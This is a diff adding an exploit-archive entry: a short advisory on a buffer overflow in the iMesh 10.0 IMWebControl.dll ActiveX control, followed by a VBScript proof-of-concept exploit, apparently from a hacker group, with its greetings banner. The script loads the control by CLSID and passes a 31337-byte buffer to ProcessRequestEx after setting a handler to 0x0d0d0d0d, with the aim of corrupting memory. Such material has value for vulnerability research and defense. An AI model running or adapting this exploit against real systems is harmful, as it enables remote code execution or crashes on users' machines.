@@ -1,0 +1,63 @@
+source: http://www.securityfocus.com/bid/48550/info
+
+iMesh is prone to a buffer overflow vulnerability because the application fails to perform adequate boundary-checks on user-supplied data.
+
+Successfully exploiting this issue allows remote attackers to execute arbitrary code in the context of the application using an affected ActiveX control (typically Internet Explorer). Failed exploit attempts likely result in denial-of-service conditions.
+
+iMesh 10.0 is vulnerable; other versions may also be affected.
+
+<!--
+###
+# Title : iMesh <= 10.0 (IMWebControl.dll) Remote Buffer Overflow Exploit
+# Author : KedAns-Dz
+# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com
+# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
+# Web Site : www.1337day.com * www.exploit-id.com * www.dis9.com
+# Twitter page : twitter.com/kedans
+# platform : windows
+# Impact : Remote Buffer Overflow & DLL Hijacked
+##
+# <3 Liyan Oz + All UE-Team & I.BackTrack Team <3
+###
+-->
+
+<?XML version=&#039;1.0&#039; standalone=&#039;yes&#039; ?>
+<package>
+<job id=&#039;DoneInVBS&#039; debug=&#039;false&#039; error=&#039;true&#039;>
+<object classid=&#039;clsid:7C3B01BC-53A5-48A0-A43B-0C67731134B97&#039; id=&#039;target&#039;/>
+<script language=&#039;vbscript&#039;>
+
+&#039;Wscript.echo typename(target)
+
+targetFile = "C:\Program Files\iMesh Applications\iMesh\IMWebControl.dll"
+prototype  = "ProcessRequestEx ( ByVal sourceName As String ,  ByVal destName As String ,  ByVal bFailIfExists As Long )"
+memberName = "ProcessRequestEx"
+progid     = "target.IMWebControl"
+
+buf=String(31337, "A") &#039; Buffer Overflow
+puf=218959117 &#039;set ecx to 0x0d0d0d0d
+
+target.SetHandler puf
+target.ProcessRequestEx buf ,puf &#039; Bo0M !
+
+</script>
+</job>
+</package>
+
+
+<!--
+#================[ Exploited By KedAns-Dz * Inj3ct0r * ]========================================= 
+# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS > ++ Liyan Oz & Blackrootkit ..all
+# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com) 
+# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * eidelweiss * SeeMe * XroGuE * ZoRLu
+# gunslinger_ * Sn!pEr.S!Te * anT!-Tr0J4n * ^Xecuti0N3r &#039;www.1337day.com/team&#039; ++ .... * Str0ke
+# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * TreX (hotturks.org)
+# Jago-Dz (sec4ever.com) * Kalashinkov3 * PaCketStorm Team (www.packetstormsecurity.org)
+# www.metasploit.com * Underground Exploitation (www.dis9.com) * All Security and Exploits Webs ...
+# -+-+-+-+-+-+-+-+-+-+-+-+={ Greetings to Friendly Teams : }=+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+# (D) HaCkerS-StreeT-Team (Z) | Inj3ct0r | Exploit-ID | UE-Team | PaCket.Storm.Sec TM | Sec4Ever 
+# h4x0re-Sec | Dz-Ghost | INDONESIAN CODER | HotTurks | IndiShell | D.N.A | DZ Team | Milw0rm
+# Indian Cyber Army | MetaSploit | BaCk-TraCk | AutoSec.Tools | HighTech.Bridge SA | Team DoS-Dz
+#================================================================================================
+-->
+
